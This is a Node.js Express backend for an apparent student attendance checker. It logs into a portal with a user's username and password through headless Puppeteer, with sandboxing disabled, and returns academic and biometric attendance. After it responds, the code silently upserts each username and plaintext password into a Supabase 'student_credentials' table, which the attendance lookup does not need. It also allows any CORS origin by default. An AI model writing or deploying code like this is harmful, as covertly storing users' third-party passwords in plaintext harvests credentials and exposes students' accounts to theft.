const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const { launchBrowser, login, fetchAcademic, fetchBiometric } = require("./fetchAttendance");

const app = express();

// --- CORS ---
// Use environment variable for frontend origin
app.use(cors({ origin: process.env.FRONTEND_URL || "*" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- Supabase setup ---
// Use environment variables for security
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// --- Route: fetch attendance sequentially ---
app.post("/get-attendance", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ success: false, error: "Username and password required" });

  let browser, page;
  try {
    // Puppeteer launch with cloud-friendly flags
    ({ browser, page } = await launchBrowser({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    }));
    
    await login(page, username, password);

    // --- Step 1: Academic Attendance ---
    const academicWithTargets = await fetchAcademic(page);
    res.write(JSON.stringify({ step: "academic", data: academicWithTargets }) + "\n");

    // --- Step 2: Biometric Attendance ---
    const biometricAttendance = await fetchBiometric(page);
    res.write(JSON.stringify({ step: "biometric", data: biometricAttendance }) + "\n");

    res.end(); // close response after both

    const now = new Date().toISOString();

    // --- Save credentials to Supabase ---
    const { error: credError } = await supabase
      .from("student_credentials")
      .upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] });
    if (credError) console.error("Supabase insert error:", credError);

    // --- Record site visit ---
    const { error: visitError } = await supabase
      .from("site_visits")
      .insert([{ username, visited_at: now }]);
    if (visitError) console.error("Supabase visit insert error:", visitError);

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  } finally {
    if (browser) await browser.close();
  }
});

// --- Route: get today's login count ---
app.get("/today-logins", async (req, res) => {
  try {
    const startOfDay = new Date();
    startOfDay.setHours(0,0,0,0);
    const endOfDay = new Date();
    endOfDay.setHours(23,59,59,999);

    const { count, error } = await supabase
      .from("site_visits")
      .select("id", { count: "exact", head: true })
      .gte("visited_at", startOfDay.toISOString())
      .lte("visited_at", endOfDay.toISOString());

    if (error) throw error;

    res.json({ today_logins: count });
  } catch (err) {
    console.error(err);
    res.status(500).json({ today_logins: 0 });
  }
});

// --- Start server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running ✅ on port ${PORT}`));
